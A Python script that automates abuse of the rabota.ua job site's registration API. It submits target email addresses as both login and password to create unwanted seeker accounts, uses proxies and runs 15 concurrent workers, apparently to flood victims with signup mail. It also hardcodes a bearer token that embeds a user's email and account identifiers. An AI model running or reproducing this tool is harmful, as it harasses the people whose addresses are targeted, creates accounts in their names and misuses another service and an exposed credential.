from os.path import basename

import requests

import module

headers = {
    'authority': 'dracula.rabota.ua',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'uk',
    'apollographql-client-name': 'web-alliance-desktop',
    'apollographql-client-version': 'c69d390',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1bmlxdWVfbmFtZSI6Iml5dnhoNjh0dXNAYmhlcHMuY29tIiwiZW1haWwiOiJpeXZ4aDY4dHVzQGJoZXBzLmNvbSIsInN1YiI6ImY5NTI1ZjA0LWIwNmQtNGYyNy1iNzliLTFlY2Q4OGVhMzhjYSIsIklkIjoiZjk1MjVmMDQtYjA2ZC00ZjI3LWI3OWItMWVjZDg4ZWEzOGNhIiwiRW1haWxJZCI6IjE0NDkxOTg2IiwiTm90ZWJvb2tJZCI6IjEzMTMxODA5IiwiSXNFbXBsb3llciI6IjAiLCJNdWx0aVVzZXJJZCI6IjAiLCJDb21wYW55TmFtZSI6IiIsIlVzZXJOYW1lIjoidGVzdCIsIlJvbGVJZCI6IjAiLCJJc0FsbG93ZWRUb1B1Ymxpc2giOiJ0cnVlIiwiUGhvbmUiOiIiLCJBdmF0YXJVcmwiOiIiLCJUb2tlbkNyZWF0aW9uRGF0ZSI6IjEvMjUvMjAyMyAzOjAxOjMxIFBNIiwiaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvd3MvMjAwNS8wNS9pZGVudGl0eS9jbGFpbXMvaGFzaCI6Ik9Yd21vb0FTZlUvNytZc0J4MGNENlE9PSIsImNlcnR0aHVtYnByaW50IjoiTTl6elVpYXJFVCtzK05rUXoxS1M3ck5rcUMxSjF2Y2w3T0hySlord0J0T3Z1czVkak1kOG4vSGtPb3JVUGhLTFJVZFdXQllWQjRNTGFRbXFlTUFvbEo4dVErQTdvb3RDUG5pd1BIT2FuSjl5MXVsWnEyazZDbjY1Q3Uxa2drRlpQTllXT3FpYk1scWxLc2pUSW1DRzJnPT0iLCJpc3MiOiJyYWJvdGEudWEiLCJhdWQiOiJyYWJvdGEudWEiLCJleHAiOjE2OTAyOTAwOTF9.MZx_0e3weEstNpdvV_Xs9gLLBMpy5zCxpGAan8MRYy4',
    'content-type': 'application/json',
    'origin': 'https://rabota.ua',
    'referer': 'https://rabota.ua/ua/auth/registration/jobseeker',
    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
}

params = {
    'q': 'createSeekerProfile',
}


class ConcreteSpam(module.Spam):

    def post(self, target) -> requests.Response | None:
        target = target if 'softumwork' not in target else target.replace('softumwork', 'wezxasqw')

        json_data = {
            'operationName': 'createSeekerProfile',
            'variables': {
                'input': {
                    'fullname': self.get_text(target=target),
                    'loginEmail': target,
                    'password': target,
                },
            },
            'query': 'mutation createSeekerProfile($input: CreateSeekerProfileInput!) {\n  users {\n    registration {\n      seeker {\n        createProfile(input: $input) {\n          errors {\n            id\n            status\n            description\n            __typename\n          }\n          isSuccess\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n',
        }

        response = requests.post('https://dracula.rabota.ua/', params=params, headers=headers, json=json_data,
                                 proxies=self.get_proxies(), timeout=10)
        return response


def main():
    s = '"isSuccess":true'
    spam = ConcreteSpam(basename(__file__)[:-3], s, target_pool_name='turk')
    res = spam.send_post(f'wezxasqw+{module.generate_text(10)}@gmail.com')
    if res:
        spam.run_concurrently(15)


if __name__ == '__main__':
    main()
